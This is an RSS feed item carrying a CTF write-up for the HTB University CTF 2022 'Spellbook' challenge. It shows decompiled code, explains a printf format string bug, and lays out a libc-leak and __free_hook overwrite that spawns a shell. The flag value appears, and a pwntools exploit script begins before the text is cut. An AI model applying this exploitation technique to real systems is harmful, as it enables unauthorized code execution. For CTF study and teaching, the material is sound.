<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Writeups on Hacklagr0y</title>
    <link>https://alagroy-42.github.io/writeups/</link>
    <description>Recent content in Writeups on Hacklagr0y</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 06 Dec 2022 16:43:40 +0100</lastBuildDate><atom:link href="https://alagroy-42.github.io/writeups/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Spellbook - [HTB University CTF 2022]</title>
      <link>https://alagroy-42.github.io/writeups/spellbook/</link>
      <pubDate>Tue, 06 Dec 2022 16:43:40 +0100</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/spellbook/</guid>
      <description>The Challenge For this challenge, we have a binary named spellbook and a libc.so.6. After fuzzing the binary, we realize that it is a storage space that seems to contain 10 available indexes (0-9) to store information about a spell. Since no overflow seems obvious and that the access to the array seems to be safe, I couldn&amp;rsquo;t find any obvious flaws in the program so I opened it in Ghidra to check what was actually going on.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
&lt;p&gt;For this challenge, we have a binary named &lt;code&gt;spellbook&lt;/code&gt; and a &lt;code&gt;libc.so.6&lt;/code&gt;. After fuzzing the binary, we realize that it is a storage space that seems to contain 10 available indexes (0-9) to store information about a spell. Since no overflow seems obvious and that the access to the array seems to be safe, I couldn&amp;rsquo;t find any obvious flaws in the program so I opened it in Ghidra to check what was actually going on.
First, we can see in the built-in types the definition of a &lt;code&gt;struct Spls&lt;/code&gt; defined as :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; Spls spl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; Spls {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; type[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; sp;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; power;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    undefined field3_0x24; &lt;span style=&#34;color:#75715e&#34;&gt;// Padding for alignement
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    undefined field4_0x25; &lt;span style=&#34;color:#75715e&#34;&gt;// Padding for alignement
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    undefined field5_0x26; &lt;span style=&#34;color:#75715e&#34;&gt;// Padding for alignement
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    undefined field6_0x27; &lt;span style=&#34;color:#75715e&#34;&gt;// Padding for alignement
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then, we notice a very interesting function called &lt;code&gt;show&lt;/code&gt; that we can call from the menu. Here is its decompiled code :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lVar1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ulong uVar2;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; in_FS_OFFSET;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  size_t idx;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(in_FS_OFFSET &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001017d8);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  uVar2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read_num();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((uVar2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (table[uVar2] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; (spl &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001019a8);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(table[uVar2]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;type);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001019c6);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(table[uVar2]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sp);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101800,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001017f7,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101198);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(in_FS_OFFSET &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __stack_chk_fail();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is a simple function that displays an entry from the &lt;code&gt;spl&lt;/code&gt; table. This function is using the &lt;code&gt;printf&lt;/code&gt; function to do so, with some calls on data controlled by us. That allows us to use our data with a custom &lt;code&gt;printf&lt;/code&gt; format string so that we can read/write data and eventually redirect the execution flow to get a shell.&lt;/p&gt;
&lt;p&gt;Disclaimer : The value of the flag is &lt;code&gt;HTB{f45tb1n_c0rrupt10n_0n_p4g3_gl1bc_2.23}&lt;/code&gt; which means that the author of the challenge probably wanted us to use some heap exploitation technique to get the flag. However, after seeing it, I didn&amp;rsquo;t really looked for another code vulnerability and completely missed the heap exploitation possibilities.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll come back to why later but another interesting function from the binary is the &lt;code&gt;delete&lt;/code&gt; function :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lVar1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  spl &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;__ptr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ulong uVar2;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; in_FS_OFFSET;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  size_t idx;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  spl &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(in_FS_OFFSET &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001017d8);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  uVar2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read_num();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((uVar2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (table[uVar2] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; (spl &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; table[uVar2];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    free(__ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sp);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    free(__ptr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101978,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001018d0,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101198);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101800,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001017f7,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101198);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(in_FS_OFFSET &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __stack_chk_fail();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As we can see there, we can call the &lt;code&gt;free&lt;/code&gt; function on any entry we want, which means that we can control the argument that we give it when it frees &lt;code&gt;__ptr-&amp;gt;sp&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;the-exploit&#34;&gt;The exploit&lt;/h2&gt;
&lt;h4 id=&#34;what-is-a-format-string-vulnerability-&#34;&gt;What is a format string vulnerability ?&lt;/h4&gt;
&lt;p&gt;A format string vulnerability is a vulnerability which consists in sending &lt;code&gt;printf&lt;/code&gt; formatting characters that will be interpreted as such by &lt;code&gt;printf&lt;/code&gt;. The interesting formatters are &lt;code&gt;%s&lt;/code&gt;, &lt;code&gt;%p&lt;/code&gt; and &lt;code&gt;%n&lt;/code&gt;. Even though a printing function like &lt;code&gt;printf&lt;/code&gt; might seem harmless, those three formatters combined with minimum field width and positional arguments will allow us to control the execution of the binary.
The first thing to understand is how arguments are passed to function in assembly language. The first six arguments respectively go in &lt;code&gt;rdi&lt;/code&gt;, &lt;code&gt;rsi&lt;/code&gt;, &lt;code&gt;rdx&lt;/code&gt;, &lt;code&gt;rcx&lt;/code&gt;, &lt;code&gt;r8&lt;/code&gt;, &lt;code&gt;r9&lt;/code&gt;. If a function needs more than six arguments, the other ones are passed on the stack (like in x86 32 bits). For long format strings that uses several times the same argument, &lt;code&gt;printf&lt;/code&gt; implemented what is called positional arguments. It means that the following formatter &lt;code&gt;%n$x&lt;/code&gt; will display the nth argument of &lt;code&gt;printf&lt;/code&gt; as an hexadecimal number. Since arguments over 6 are supposed to be on the stack, it means that using &lt;code&gt;%7$p&lt;/code&gt; will display the first element of the stack as a pointer. If this element is an actual pointer, &lt;code&gt;%7$s&lt;/code&gt; will show us what is inside that address (until it reaches a &lt;code&gt;&#39;\0&#39;&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;The last and most critical useful formatter is &lt;code&gt;%n&lt;/code&gt;. &lt;code&gt;%n&lt;/code&gt; takes an &lt;code&gt;int *&lt;/code&gt; as an argument and will write the number of character &lt;code&gt;printf&lt;/code&gt; already write when it reaches that formatter at this address. It means that using the minimum field width, we can print a specified number of characters to control the output of &lt;code&gt;%n&lt;/code&gt; and write anything we want wherever we want (Note: even though, this is an &lt;code&gt;int *&lt;/code&gt; that will write a 32 bits value, we can use the &lt;code&gt;hh&lt;/code&gt; or &lt;code&gt;h&lt;/code&gt; modifiers to only write 16 or 8 bits). If you didn&amp;rsquo;t get that part, you should definitely read &lt;code&gt;printf&lt;/code&gt;&amp;rsquo;s man.&lt;/p&gt;
&lt;h4 id=&#34;and-in-our-case-&#34;&gt;And in our case ?&lt;/h4&gt;
&lt;p&gt;In this challenge, the string we display is located inside the heap which means that we have absolutely no control over the stack (for the moment). Let&amp;rsquo;s open &lt;code&gt;gdb&lt;/code&gt; and take a look at what the stack frame looks like when we call &lt;code&gt;printf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/spellbook_gdb.png&#34; alt=&#34;gdb&#34;&gt;&lt;/p&gt;
&lt;p&gt;There are 3 interesting values on that frame :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the 3rd one : It is a pointer on the main return address, which is located one byte before a libc pointer&lt;/li&gt;
&lt;li&gt;the 8th one : It is a pointer to &lt;code&gt;__libc_start_main+240&lt;/code&gt; which will help us leak the libc&amp;rsquo;s address to defeat ASLR&lt;/li&gt;
&lt;li&gt;the 10th one : It is a pointer on a stack pointer, which means that we can use it as an argument to write the address we want to control on the stack and then use this address to arbitrarily write where we want&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once we have everything we need to exploit this binary, here is how we will proceed: we will try to rewrite &lt;code&gt;__free_hook&lt;/code&gt;&amp;rsquo;s address to take control os the execution flow. &lt;code&gt;__free_hook&lt;/code&gt; is global variable containing a function pointer called when &lt;code&gt;free&lt;/code&gt; is called. It is set to &lt;code&gt;NULL&lt;/code&gt; by default but by controlling it, we can control the execution when we call &lt;code&gt;free&lt;/code&gt;. In the &lt;code&gt;delete&lt;/code&gt; function, we have a &lt;code&gt;free(__ptr-&amp;gt;sp);&lt;/code&gt;. If we set &lt;code&gt;__free_hook&lt;/code&gt;&amp;rsquo;s value to &lt;code&gt;system&lt;/code&gt;&amp;rsquo;s address and that we free a spell having &lt;code&gt;/bin/sh&lt;/code&gt; as a value, it will execute &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;. Since we cannot write an infinite number of character using &lt;code&gt;printf&lt;/code&gt;, we will write &lt;code&gt;system&lt;/code&gt;&amp;rsquo;s address in three times, using two bytes chunks of this address.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;use &lt;code&gt;%13$p&lt;/code&gt; to leak &lt;code&gt;__libc_start_main+240&lt;/code&gt;&amp;rsquo;s address so that we can find out where the libc is mapped in memory&lt;/li&gt;
&lt;li&gt;use &lt;code&gt;%8$p&lt;/code&gt; to leak the pointer on &lt;code&gt;main&lt;/code&gt;&amp;rsquo;s return address so that, by adding eight to it, we have a pointer on libc (it will allow us to just take care of the low bytes since the high ones already have the right value)&lt;/li&gt;
&lt;li&gt;By writing using &lt;code&gt;%15$n&lt;/code&gt; to the stack pointer, we will modify our 41th argument and make it point on the libc&amp;rsquo;s address we want to modify. We can then use &lt;code&gt;%41$n&lt;/code&gt; to set this pointer to &lt;code&gt;__free_hook&lt;/code&gt;&amp;rsquo;s address.&lt;/li&gt;
&lt;li&gt;In a loop, compute the 16 bits we want to write on &lt;code&gt;__free_hook&lt;/code&gt;&amp;rsquo;s address and then use &lt;code&gt;%13$n&lt;/code&gt; to write them. Then use &lt;code&gt;$41$n&lt;/code&gt; to update the value of &lt;code&gt;__free_hook&lt;/code&gt;&amp;rsquo;s address so that we can write the two next bytes of the address.&lt;/li&gt;
&lt;li&gt;Now that we have &lt;code&gt;__free_hook&lt;/code&gt; pointing on &lt;code&gt;system&lt;/code&gt;, we just have to create a spell having &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; in &lt;code&gt;spl-&amp;gt;sp&lt;/code&gt; and then delete it to get a shell.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Here is the script I made to get the flag :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; re
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;binname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./spellbook&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./glibc/libc.so.6&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binname
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(binname)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(libname)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add_spell&lt;/span&gt;(io, entry, payload):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(payload) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;payload won&amp;#39;t fit in the buffer&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;&amp;gt; &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)
